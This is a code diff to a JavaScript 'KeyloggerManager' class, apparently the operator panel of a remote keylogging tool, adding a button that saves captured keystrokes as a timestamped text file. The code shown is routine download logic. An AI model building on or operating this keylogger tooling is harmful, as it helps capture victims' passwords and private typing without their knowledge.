@@ -16,12 +16,8 @@ export class KeyloggerManager {
             this.stop();
         });
 
-        document.getElementById('btn-keylog-get').addEventListener('click', () => {
-            this.getData();
-        });
-
-        document.getElementById('btn-keylog-clear').addEventListener('click', () => {
-            this.clear();
+        document.getElementById('btn-keylog-save').addEventListener('click', () => {
+            this.downloadAsFile();
         });
 
         // Prevent typing in textarea
@@ -50,5 +46,37 @@ export class KeyloggerManager {
 
     clear() {
         this.ws.send('keylog_clear');
+    }
+
+    downloadAsFile() {
+        const content = this.textarea.value;
+        
+        if (!content.trim()) {
+            alert('No keylog data to download!');
+            return;
+        }
+
+        // Tạo Blob từ nội dung
+        const blob = new Blob([content], { type: 'text/plain;charset=utf-8;' });
+        
+        // Tạo URL từ Blob
+        const link = document.createElement('a');
+        const url = URL.createObjectURL(blob);
+        
+        // Đặt tên file với timestamp
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
+        link.setAttribute('href', url);
+        link.setAttribute('download', `keylogs_${timestamp}.txt`);
+        link.style.visibility = 'hidden';
+        
+        // Thêm vào DOM, click và xóa
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        
+        // Giải phóng URL
+        URL.revokeObjectURL(url);
+        
+        this.logger.log(`> Keylogs downloaded: keylogs_${timestamp}.txt`);
     }
 }
